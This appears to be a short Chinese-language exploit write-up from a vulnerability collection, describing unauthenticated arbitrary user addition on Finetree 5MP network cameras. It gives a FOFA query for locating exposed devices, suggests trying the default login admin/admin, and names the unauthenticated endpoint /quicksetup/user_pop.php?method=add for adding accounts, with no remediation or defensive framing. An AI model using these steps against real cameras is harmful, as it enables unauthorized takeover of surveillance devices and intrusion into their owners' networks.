## Finetree-5MP-摄像机未授权任意用户添加

## 漏洞描述

Finetree-5MP-摄像机未授权任意用户添加

## 漏洞影响

> Finetree-5MP-摄像机

## FOFA

> app="Finetree-5MP-Network-Camera"

## 漏洞复现

登录界面如下：

![1](_v_images/Finetree-5MP-摄像机/1.png)

首先可以尝试一下弱口令admin/admin，很多都存在。

若不存在则访问漏洞URL进行用户添加：

```
/quicksetup/user_pop.php?method=add
```

![2](_v_images/Finetree-5MP-摄像机/2.png)